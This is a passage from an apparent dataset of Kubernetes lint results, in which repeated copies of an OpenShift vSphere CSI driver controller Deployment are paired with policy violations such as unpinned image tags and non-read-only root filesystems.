--http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"vsphere-syncer\" is using an invalid container image, \"${VMWARE_VSPHERE_SYNCER_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8973",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"attacher-kube-rbac-proxy\" does not have a read-only root file system"
  },
  {
    "id": "8974",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-attacher\" does not have a read-only root file system"
  },
  {
    "id": "8975",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-driver\" does not have a read-only root file system"
  },
  {
    "id": "8976",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: 